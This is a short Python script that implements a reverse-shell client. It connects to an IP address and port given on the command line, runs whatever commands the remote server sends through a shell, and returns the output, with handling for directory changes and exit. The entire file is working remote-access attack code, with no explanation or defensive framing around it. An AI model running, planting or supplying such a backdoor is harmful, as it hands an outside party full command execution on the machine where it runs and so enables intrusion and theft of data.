import socket
import subprocess
import os
import sys


def session_handler():
    print(f'[+] Connecting to {target_ip}.')
    sock.connect((target_ip, target_port))
    print(f'[+] Connected to {target_ip}.')
    while True:
        message = inbound()
        print(f'[+] Message received - {message}')
        if message == 'exit':
            print('[-] The server has terminated the session.')
            sock.close()
            break
        elif message.split(" ")[0] == 'cd':
            try:
                directory = str(message.split(" ")[1])
                os.chdir(directory)
                cur_dir = os.getcwd()
                print(f'[+] Changed to {cur_dir}')
                outboud(cur_dir)
            except FileNotFoundError:
                outboud('Invalid directory.  Try again.')
                continue
        elif message == 'background':
            pass
        else:
            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = command.stdout.read() + command.stderr.read()
            outboud(output.decode())


def inbound():
    print('[+] Awaiting response...')
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            return message
        except Exception:
            sock.close()


def outboud(message):
    response = str(message).encode()
    sock.send(response)


if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])
        session_handler()
    except IndexError:
        print('[-] Command line argument(s) missing.  Please try again.')
    except Exception as e:
        print(e)
